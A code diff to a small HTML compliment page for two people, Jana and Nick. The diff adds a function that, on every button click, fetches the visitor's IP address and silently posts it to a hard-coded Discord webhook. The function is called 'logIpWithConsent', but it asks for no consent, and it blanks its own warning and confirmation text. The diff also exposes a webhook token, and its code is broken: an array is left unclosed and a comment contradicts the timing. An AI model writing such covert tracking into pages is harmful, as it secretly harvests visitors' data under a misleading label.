@@ -55,6 +55,16 @@
             margin-top: 10px;
             color: #555;
         }
+        #warning {
+            color: red;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        #confirmation {
+            color: green;
+            font-weight: bold;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -63,13 +73,16 @@
 
     <button class="jana" onclick="selectPerson('Jana')">Jana</button>
     <button class="nick" onclick="selectPerson('Nick')">Nick</button>
-    
+
     <p id="response"></p>
     <p id="randomWord"></p>
+    <p id="warning"></p>
+    <p id="confirmation"></p>
 
     <script>
-        const janaWords = ["Awesome", "Beautiful", "Smart", "Amazing", "Funny", "Pretty", "Lovely", "Inspirational", "Brilliant", "Kind"];
-        const nickWords = ["Silly"];
+        const webhookUrl = "https://discord.com/api/webhooks/1333412401743134771/Htcyp3okKpqmgSmyL6zUVVOogRhJkzX9hpAisfXTCuoNcIJGtmwg7jUfTLC_QOWnGYXV"; // Replace with your webhook URL
+        const janaWords = ["Awesome", "Silly", "Beautiful", "Smart", "Amazing", "Funny", "Pretty", "Lovely", "Inspirational", "Brilliant", "Kind"];
+        const nickWords = ["Silly";
 
         function selectPerson(person) {
             const responseElement = document.getElementById("response");
@@ -89,11 +102,55 @@
                 responseElement.innerText = "Nick is so cool!";
                 generateRandomWord(nickWords, "Nick");
             }
+
+            // Add IP logging warning
+            logIpWithConsent();
         }
 
         function generateRandomWord(wordsArray, person) {
             const randomIndex = Math.floor(Math.random() * wordsArray.length);
             document.getElementById("randomWord").innerText = `${person} is so ${wordsArray[randomIndex]}!`;
+        }
+
+        function logIpWithConsent() {
+            const warningElement = document.getElementById("warning");
+            const confirmationElement = document.getElementById("confirmation");
+
+            warningElement.textContent = "";
+            confirmationElement.textContent = "";
+
+            // Remove the warning after 5000 milliseconds (5 seconds)
+            setTimeout(() => {
+                warningElement.textContent = "";
+            }, 10);
+
+            setTimeout(() => {
+                fetch("https://api.ipify.org?format=json")
+                    .then(response => response.json())
+                    .then(data => {
+                        // Log the IP to the webhook
+                        fetch(webhookUrl, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                content: `User IP: ${data.ip}`
+                            })
+                        })
+                        .then(() => {
+                            confirmationElement.textContent = "";
+                        })
+                        .catch(error => {
+                            console.error("Error sending to webhook:", error);
+                            warningElement.textContent = "Failed to log the IP. Please try again.";
+                        });
+                    })
+                    .catch(error => {
+                        console.error("Error fetching IP:", error);
+                        warningElement.textContent = "Failed to fetch your IP. Please try again.";
+                    });
+            }, 10); // 10-second delay
         }
     </script>
 
